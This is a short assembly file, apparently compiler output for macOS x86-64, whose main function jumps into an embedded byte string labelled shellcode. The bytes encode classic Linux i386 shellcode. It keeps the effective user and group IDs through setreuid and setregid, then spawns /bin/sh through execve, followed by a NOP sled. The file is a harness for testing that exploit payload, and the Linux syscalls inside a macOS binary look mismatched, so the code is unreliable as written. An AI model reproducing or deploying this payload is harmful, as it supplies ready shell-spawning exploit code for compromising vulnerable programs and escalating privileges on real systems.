	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 10, 14	sdk_version 10, 14
	.globl	_main                   ## -- Begin function main
	.p2align	4, 0x90
_main:                                  ## @main
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$16, %rsp
	leaq	_shellcode(%rip), %rax
	movq	%rax, -8(%rbp)
	movb	$0, %al
	callq	*-8(%rbp)
	xorl	%eax, %eax
	addq	$16, %rsp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.section	__DATA,__data
	.globl	_shellcode              ## @shellcode
	.p2align	4
_shellcode:
	.asciz	"\271\377\377\377\3771\300\2601\315\200\211\3031\300\260F\315\2001\300\2602\315\200\211\303\2601\260G\315\2001\3001\322Rh//shh/bin\211\343RS\211\341\260\013\315\2001\300@\315\200\220\220\220\220\220\220\220\220\220\220\220\220"


.subsections_via_symbols
